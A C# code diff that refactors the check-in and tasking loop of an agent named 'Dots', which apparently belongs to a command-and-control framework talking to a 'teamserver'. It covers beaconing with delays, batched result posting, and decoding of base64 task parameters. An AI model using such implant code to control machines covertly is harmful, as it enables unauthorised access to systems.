@@ -21,7 +21,6 @@ namespace Dots
         private ConcurrentQueue<TaskError> _batchErrors = new ConcurrentQueue<TaskError>();
         private TaskResult _checkInTask {get; set; }
         private readonly HttpClient _client = new HttpClient();
-        private CancellationTokenSource _tokenSource;
 
         // Why does the agent not reconnect after I close the teamserver?
         // Is there a better way to do SendTask/SendError with iEnumerable<DotsTask>
@@ -43,7 +42,7 @@ namespace Dots
             _client.DefaultRequestHeaders.Add("Authorization", $"JWT {GenerateAuthorizationToken()}");
         }
 
-        public async Task InitialCheckin(string key)
+        public string InitialCheckin(string key)
         {
             TaskResult initialCheckinTask = new TaskResult
             {
@@ -52,14 +51,14 @@ namespace Dots
                 Id = key
             };
             string json = JsonSerializer.Serialize(initialCheckinTask);
-            HttpResponseMessage response = await _client.PostAsync(GenerateEndpoint(), new StringContent(json, Encoding.UTF8, "application/json"));
+            HttpResponseMessage response =  _client.PostAsync(GenerateEndpoint(), new StringContent(json, Encoding.UTF8, "application/json")).Result;
             if (response.IsSuccessStatusCode)
             {
-                string checkInTaskId = await response.Content.ReadAsStringAsync();
+                string checkInTaskId = response.Content.ReadAsStringAsync().Result;
 
                 if (checkInTaskId.Length != 10)
                 {
-                    return;
+                    return null;
                 }
                 _checkInTask = new TaskResult
                 {
@@ -67,33 +66,34 @@ namespace Dots
                     Result = "",
                     Id = checkInTaskId
                 };
-
+                return checkInTaskId;
             }
             else
             {
-                return;
+                return null;
             }
         }
 
         public async Task Start(DotsProperties _dotsProperty)
         {
-            _tokenSource = new CancellationTokenSource();
-            while (!_tokenSource.IsCancellationRequested)
+            while (_dotsProperty.ProcessTasks)
             {
-                Thread.Sleep(_dotsProperty.GenerateDelay());
+                // Retrieve all Results and Errors
+                IEnumerable<DotsTask> batchResult = RetrieveBatchResults();
+                IEnumerable<DotsTask> batchErrors = RetrieveBatchErrors();
+                List<object> batchResponse = new List<object>();
+                batchResponse.AddRange(batchResult);
+                batchResponse.AddRange(batchErrors);
+                await Task.Delay(_dotsProperty.GenerateDelay());
+
                 if (_checkInTask !=  null) {
                     _batchResults.Enqueue(_checkInTask);
                 } else
                 {
                     continue;
                 }
-                IEnumerable<DotsTask> batchResult = RetrieveBatchResults();
-                IEnumerable<DotsTask> batchErrors = RetrieveBatchErrors();
 
                 // Combine response and errors into a single list
-                List<object> batchResponse = new List<object>();
-                batchResponse.AddRange(batchResult);
-                batchResponse.AddRange(batchErrors);
                 string json = JsonSerializer.Serialize(batchResponse);
                 HttpResponseMessage response = new HttpResponseMessage();
                 try
@@ -109,19 +109,9 @@ namespace Dots
                     {
                         string responseBody = await response.Content.ReadAsStringAsync();
                         var tasks = JsonSerializer.Deserialize<TaskRequest[]>(responseBody);
-                        if (tasks != null && tasks.Any())
-                        {
-                            foreach (var task in tasks)
-                            {
-                                for (int i = 0; i < task.Params.Length; i++)
-                                {
-                                    task.Params[i] = Base64Decode(task.Params[i]);
-                                }
-
-                                _batchRequest.Enqueue(task);
-                            }
-                        }
-                    } catch (Exception ex) 
+                        ParseBatchRequest(tasks);
+                    }
+                    catch (Exception ex)
                     {
                         TaskError failedToParseError = new TaskError
                         {
@@ -136,20 +126,29 @@ namespace Dots
                         _batchErrors.Enqueue(failedToParseError);
                     }
                 }
-                
             }
         }
 
-        public void Stop()
+        public void ParseBatchRequest(TaskRequest[] tasks)
         {
-            _tokenSource.Cancel();
+            if (tasks != null && tasks.Any())
+            {
+                foreach (var task in tasks)
+                {
+                    for (int i = 0; i < task.Params.Length; i++)
+                    {
+                        task.Params[i] = Base64Decode(task.Params[i]);
+                    }
+                    _batchRequest.Enqueue(task);
+                }
+            }
         }
 
         public bool RetrieveBatchRequest(out IEnumerable<TaskRequest> tasks)
         {
             if (_batchRequest.IsEmpty)
             {
-                tasks = null; 
+                tasks = null;
                 return false;
             }
 
